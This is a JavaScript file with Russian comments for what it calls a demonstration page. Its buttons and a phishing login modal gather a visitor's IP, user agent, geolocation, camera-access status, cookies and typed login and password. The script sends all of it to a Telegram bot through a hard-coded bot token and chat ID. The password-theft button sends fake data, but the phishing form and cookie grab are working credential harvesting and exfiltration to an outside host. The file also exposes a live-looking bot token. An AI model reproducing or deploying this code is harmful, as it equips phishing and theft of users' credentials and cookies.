// --- Настройки Telegram бота ---
const TELEGRAM_BOT_TOKEN = '7586619534:AAF6e4jBH2aEVIVGW9I5Fdze--3pmXnja60';  // вставьте сюда свой токен
const TELEGRAM_CHAT_ID = '7408565938';               // вставьте сюда свой chat_id

// Функция отправки сообщения в Telegram
async function sendTelegramMessage(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      }),
    });
  } catch (err) {
    console.error('Ошибка отправки в Telegram:', err);
  }
}

// --- Логирование в интерфейс ---
const logContent = document.getElementById('log-content');
function addLog(text) {
  const time = new Date().toLocaleTimeString();
  logContent.textContent += `[${time}] ${text}\n`;
  logContent.scrollTop = logContent.scrollHeight;
}

// --- Функции для сбора данных ---
// IP получить через внешний сервис (публичный API)
async function getIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip;
  } catch {
    return 'Не удалось получить IP';
  }
}

// DNS — получим домен текущего сайта (условно)
function getDNS() {
  return window.location.hostname;
}

// User-Agent
function getUserAgent() {
  return navigator.userAgent;
}

// Геолокация
function getGeolocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject('Геолокация не поддерживается');
      return;
    }
    navigator.geolocation.getCurrentPosition(
      pos => resolve(`Широта: ${pos.coords.latitude}, Долгота: ${pos.coords.longitude}`),
      err => reject('Отказано в доступе к геолокации')
    );
  });
}

// Доступ к камере (пробуем запросить)
async function tryCameraAccess() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    stream.getTracks().forEach(track => track.stop());
    return 'Доступ к камере получен';
  } catch {
    return 'Доступ к камере запрещён или отсутствует';
  }
}

// Получить куки сайта (если есть)
function getCookies() {
  return document.cookie || 'Куки отсутствуют';
}

// Кража паролей — имитация (т.к. невозможно реально получить)
// Просто создадим фейковые данные
function getFakePasswords() {
  return 'login1: password123\nlogin2: qwerty\nuser: 123456';
}

// --- Работа с элементами страницы ---

// Модальное окно фишинга
const phishingModal = document.getElementById('phishing-modal');
const phishingCloseBtn = document.getElementById('phishing-close');
const phishingForm = document.getElementById('phishing-form');

phishingCloseBtn.onclick = () => {
  phishingModal.style.display = 'none';
};

window.onclick = (event) => {
  if (event.target == phishingModal) {
    phishingModal.style.display = 'none';
  }
};

phishingForm.onsubmit = (e) => {
  e.preventDefault();
  const login = phishingForm['login'].value;
  const password = phishingForm['password'].value;

  const message = `<b>Фишинг: украдены данные входа</b>\nЛогин: ${login}\nПароль: ${password}`;
  sendTelegramMessage(message);
  addLog(`Фишинговая атака: получен логин "${login}" и пароль.`);

  phishingForm.reset();
  phishingModal.style.display = 'none';
  alert('Данные отправлены "мошенникам" (для демонстрации).');
};

// --- Обработчики кнопок ---

document.getElementById('log-ip').onclick = async () => {
  const ip = await getIP();
  const msg = `<b>Получен IP-адрес:</b> ${ip}`;
  addLog(msg.replace(/<[^>]+>/g, ''));
  sendTelegramMessage(msg);
};

document.getElementById('log-dns').onclick = () => {
  const dns = getDNS();
  const msg = `<b>Получен DNS:</b> ${dns}`;
  addLog(msg.replace(/<[^>]+>/g, ''));
  sendTelegramMessage(msg);
};

document.getElementById('log-ua').onclick = () => {
  const ua = getUserAgent();
  const msg = `<b>Получен User-Agent:</b> ${ua}`;
  addLog(msg.replace(/<[^>]+>/g, ''));
  sendTelegramMessage(msg);
};

document.getElementById('log-geo').onclick = async () => {
  try {
    const geo = await getGeolocation();
    const msg = `<b>Получена геолокация:</b> ${geo}`;
    addLog(msg.replace(/<[^>]+>/g, ''));
    sendTelegramMessage(msg);
  } catch (err) {
    addLog(err);
  }
};

document.getElementById('log-camera').onclick = async () => {
  const cam = await tryCameraAccess();
  const msg = `<b>Камера:</b> ${cam}`;
  addLog(msg.replace(/<[^>]+>/g, ''));
  sendTelegramMessage(msg);
};

document.getElementById('log-phishing').onclick = () => {
  phishingModal.style.display = 'block';
  addLog('Показано окно фишинга для ввода данных.');
};

document.getElementById('log-cookie').onclick = () => {
  const cookies = getCookies();
  const msg = `<b>Кража куки:</b>\n${cookies}`;
  addLog('Получены куки сайта.');
  sendTelegramMessage(msg);
};

document.getElementById('log-passwords').onclick = () => {
  const passwords = getFakePasswords();
  const msg = `<b>Кража паролей:</b>\n${passwords}`;
  addLog('Симуляция кражи паролей.');
  sendTelegramMessage(msg);
};
